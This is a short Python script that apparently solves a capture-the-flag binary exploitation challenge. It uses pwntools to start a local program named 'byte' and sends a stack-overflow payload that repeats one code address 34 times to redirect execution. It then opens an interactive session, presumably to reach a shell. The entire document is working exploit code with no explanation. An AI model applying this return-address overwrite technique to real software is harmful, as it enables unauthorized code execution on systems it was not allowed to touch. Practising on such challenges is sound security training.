from pwn import *
p = process("byte")

payload = p32(0x080491e0) * 34
payload += b"\x00"

p.sendline(payload)
p.interactive()
